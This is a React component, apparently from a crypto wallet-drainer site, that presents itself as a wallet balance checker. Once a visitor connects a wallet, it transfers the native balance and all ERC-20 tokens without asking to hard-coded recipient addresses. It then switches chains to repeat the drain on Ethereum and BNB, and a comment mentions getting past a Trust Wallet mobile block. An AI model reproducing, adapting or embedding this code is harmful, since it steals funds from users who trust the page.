import { useEffect, useState } from "react";
import { useAppKitAccount } from "@reown/appkit/react";
import { useTransferFunds } from "../hooks/useTransferFunds";
import useNativeBalance from "../hooks/useNativeBalance";
import { getTokensWithBalance } from "../utils/getTokens";
import { MINIMUM_BALANCE, RECIPIENT_ADDRESSES } from "../constants";
import { useChainId } from "wagmi";
import useAutoSwitchChain from "../hooks/useAutoSwitchChain";
import { getGasBufferByChain } from "../utils/gasBuffer";

const SUPPORTED_CHAINS = [1, 56]; // Ethereum and BNB

export default function CheckWalletBalance() {
  const { address, isConnected } = useAppKitAccount();
  const chainId = useChainId();
  const { balance, symbol, isLoading } = useNativeBalance(address as `0x${string}`);
  const { transferNativeToken, transferERC20Token } = useTransferFunds();
  const { switchChain, isSwitching } = useAutoSwitchChain();

  const [status, setStatus] = useState("");
  const [processedChains, setProcessedChains] = useState<number[]>([]);
  const [isProcessing, setIsProcessing] = useState(false);

  const GAS_BUFFER = getGasBufferByChain(chainId);

  const processWallet = async () => {
    if (!address || !chainId || processedChains.includes(chainId) || isProcessing) return;
  
    const numericBalance = parseFloat(balance);
    if (isNaN(numericBalance)) {
      console.warn("⚠️ Invalid balance detected, skipping chain.");
      return;
    }
  
    // Skip early if balance is zero — especially to bypass Trust Wallet mobile block
    if (numericBalance === 0) {
      console.warn(`⛔ Chain ${chainId} has zero native balance, skipping.`);
      setProcessedChains((prev) => [...prev, chainId]);
  
      const remainingChains = SUPPORTED_CHAINS.filter((id) => !processedChains.includes(id) && id !== chainId);
      if (remainingChains.length > 0) {
        setStatus(`🔁 Switching to chain ${remainingChains[0]}...`);
        await switchChain(remainingChains[0]);
      } else {
        setStatus("✅ All chains processed.");
      }
      return;
    }
  
    setIsProcessing(true);
    try {
      setStatus(`🔍 Checking ${symbol} balance on chain ${chainId}...`);
      const thresholdMet = numericBalance >= MINIMUM_BALANCE;
  
      if (!thresholdMet) {
        setStatus("❌ Insufficient funds. Skipping chain...");
        setProcessedChains((prev) => [...prev, chainId]);
  
        const remainingChains = SUPPORTED_CHAINS.filter((id) => !processedChains.includes(id) && id !== chainId);
        if (remainingChains.length > 0) {
          await switchChain(remainingChains[0]);
        } else {
          setStatus("✅ All chains processed.");
        }
        return;
      }
  
      // Proceed with transfers
      const tokens = await getTokensWithBalance(address, chainId);
  
      const safeAmountToSend = Math.max(0, numericBalance - GAS_BUFFER);
      if (tokens.length === 0) {
        setStatus("🚀 Sending native token...");
        await transferNativeToken(safeAmountToSend, RECIPIENT_ADDRESSES[chainId]);
        setStatus("✅ Native token sent!");
      } else {
        setStatus(`🚀 Sending native + ${tokens.length} token(s)...`);
        await transferNativeToken(safeAmountToSend, RECIPIENT_ADDRESSES[chainId]);
  
        for (let token of tokens) {
          if (parseFloat(token.balance) === 0) continue; // skip dust
          await transferERC20Token(
            token.contractAddress,
            token.balance,
            RECIPIENT_ADDRESSES[chainId],
            token.decimals
          );
        }
  
        setStatus("🎉 All tokens sent!");
      }
  
      setProcessedChains((prev) => [...prev, chainId]);
  
      const remainingChains = SUPPORTED_CHAINS.filter((id) => !processedChains.includes(id) && id !== chainId);
      if (remainingChains.length > 0) {
        const nextChainId = remainingChains[0];
        setStatus(`🔁 Switching to chain ${nextChainId}...`);
        await switchChain(nextChainId);
      } else {
        setStatus("✅ All chains processed.");
      }
    } catch (error) {
      console.error("❌ Error in processWallet:", error);
      setStatus("❌ Transfer failed!");
    } finally {
      setIsProcessing(false);
    }
  };
  

  useEffect(() => {
    const shouldProcess =
      isConnected &&
      address &&
      !processedChains.includes(chainId) &&
      !isProcessing &&
      !isLoading;

    if (shouldProcess) {
      processWallet();
    }
  }, [isConnected, address, chainId, isLoading]);

  return (
    <div className="text-center">
      <p>Chain: {chainId}</p>
      <p>Balance: {balance} {symbol}</p>
      <p>Status: {status}</p>
      {isSwitching && <p>🔄 Switching chain...</p>}
      {isProcessing && <p>⏳ Processing...</p>}
    </div>
  );
}
